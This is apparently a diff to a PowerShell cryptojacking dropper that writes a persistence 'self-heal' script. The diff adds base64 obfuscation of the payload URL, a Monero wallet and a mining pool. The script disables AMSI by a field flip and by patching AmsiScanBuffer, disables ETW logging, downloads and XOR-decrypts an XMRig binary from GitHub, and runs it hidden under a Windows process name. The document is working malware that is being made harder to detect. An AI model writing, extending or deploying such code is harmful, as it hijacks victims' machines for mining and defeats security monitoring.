@@ -195,16 +195,20 @@ $null = $I.Invoke(7,8)
 function Write-SelfHealScript {
     $healCode = @"
 `$ErrorActionPreference = "SilentlyContinue"
+function X(`$s){ [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(`$s)) }
 try { `$asm = [System.Reflection.Assembly]::LoadWithPartialName('System.Management.Automation'); `$type = `$asm.GetType('System.Management.Automation.AmsiUtils'); `$field = `$type.GetField('amsiInitFailed', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static); `$field.SetValue(`$null, `$true) } catch {}
-try { `$scanBuffer = `$asm.GetType('System.Management.Automation.AmsiUtils').GetMethod('AmsiScanBuffer', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static); if (`$scanBuffer) { `$scanPtr = `$scanBuffer.MethodHandle.GetFunctionPointer(); `$oldProtect = [UInt32]0; `$VP = Add-Type -MemberDefinition '[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);' -Name "Kernel32" -Namespace "Win32" -PassThru; `$VP::VirtualProtect(`$scanPtr, [UInt32]32, [UInt32]0x40, [ref]`$oldProtect) | Out-Null; [System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xC3), 0, `$scanPtr, 1) } } catch {}
-try { `$etwType = `$asm.GetType('System.Management.Automation.PSEtwLogProvider'); `$etwField = `$etwType.GetField('etwProvider', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static); `$etwField.SetValue(`$null, `$null) } catch {}
+try { `$sb = `$asm.GetType('System.Management.Automation.AmsiUtils').GetMethod('AmsiScanBuffer', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static); if (`$sb) { `$sp = `$sb.MethodHandle.GetFunctionPointer(); `$op = [UInt32]0; `$v = Add-Type -MemberDefinition '[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a, UInt32 b, UInt32 c, out UInt32 d);' -Name "K32" -Namespace "Win32" -PassThru; `$v::VirtualProtect(`$sp, [UInt32]32, [UInt32]0x40, [ref]`$op) | Out-Null; [System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xC3), 0, `$sp, 1) } } catch {}
+try { `$et = `$asm.GetType('System.Management.Automation.PSEtwLogProvider'); `$ef = `$et.GetField('etwProvider', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static); `$ef.SetValue(`$null, `$null) } catch {}
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 `$root = "$rootDir"
 `$minerPath = "$minerExe"
 `$configPath = "$configFile"
 `$backupPath = "$backupDir"
 `$xorKey = [byte[]](0x4D,0x79,0x53,0x65,0x63,0x72,0x65,0x74,0x4B,0x65,0x79,0x31,0x32,0x33,0x34,0x35)
-`$encUrl = "$encBinUrl"
+`$encUrl = X('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21hcm96MTIzL0Zvb3RiYWxsL21haW4veG1yaWdfZW5jLmJpbg==')
+`$wallet = X('NDY3ZzFtZWl6RmUzMUd6Rk1HN3hveTN5eFRoRzU2cDdOTnp1dEtmZjdZUGkxRGFkQWRya1kyeExqOXpMV2paTm00aGZYb0YydXhhNlBnSkNXUWM2UVVoNjROR3BYRUw=')
+`$pool = X('cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==')
+`$worker = `$env:COMPUTERNAME
 `$running = Get-Process -Name "SearchProtocolHost" -EA SilentlyContinue | Where-Object { `$_.Path -like "*NetworkService*" }
 if (`$running) { exit 0 }
 if ((Test-Path "`$backupPath\SearchProtocolHost.exe") -and (Test-Path "`$backupPath\mssearch.dat")) {
@@ -225,7 +229,9 @@ try {
         for (`$i = 0; `$i -lt `$encBytes.Length; `$i++) { `$encBytes[`$i] = `$encBytes[`$i] -bxor `$xorKey[`$i % `$xorKey.Length] }
         if (!(Test-Path "`$root\cache")) { New-Item -ItemType Directory -Path "`$root\cache" -Force | Out-Null }
         [IO.File]::WriteAllBytes(`$minerPath, `$encBytes)
-        Set-Content -Path `$configPath -Value '{\"autosave\":false,\"cpu\":{\"max-threads-hint\":10,\"priority\":2,\"huge-pages\":true},\"opencl\":false,\"cuda\":false,\"pools\":[{\"url\":\"stratum+ssl://pool.hashvault.pro:443\",\"user\":\"467g1meizFe31GzFMG7xoy3yxThG56p7NNzutKff7YPi1DadAdrkY2xLj9zLWjZNm4hfXoF2uxa6PgJCWQc6QUh64NGpXEL\",\"pass\":\"' + `$env:COMPUTERNAME + '\",\"keepalive\":true,\"tls\":true}],\"donate-level\":0,\"background\":true,\"randomx\":{\"1gb-pages\":true,\"wrmsr\":true,\"numa\":true}}' -Force
+        `$q = [char]34
+        `$cfg = "{${q}autosave${q}:false,${q}cpu${q}:{${q}max-threads-hint${q}:10,${q}priority${q}:2,${q}huge-pages${q}:true},${q}opencl${q}:false,${q}cuda${q}:false,${q}pools${q}:[{${q}url${q}:${q}stratum+ssl://`$pool${q},${q}user${q}:${q}`$wallet${q},${q}pass${q}:${q}`$worker${q},${q}keepalive${q}:true,${q}tls${q}:true}],${q}donate-level${q}:0,${q}background${q}:true,${q}randomx${q}:{${q}1gb-pages${q}:true,${q}wrmsr${q}:true,${q}numa${q}:true}}"
+        Set-Content -Path `$configPath -Value `$cfg -Force
         Start-Process -FilePath `$minerPath -ArgumentList "--config=`"`"`$configPath`"`"" -WindowStyle Hidden -PassThru | Out-Null
         Remove-Item `$encFile -Force -EA SilentlyContinue
     }
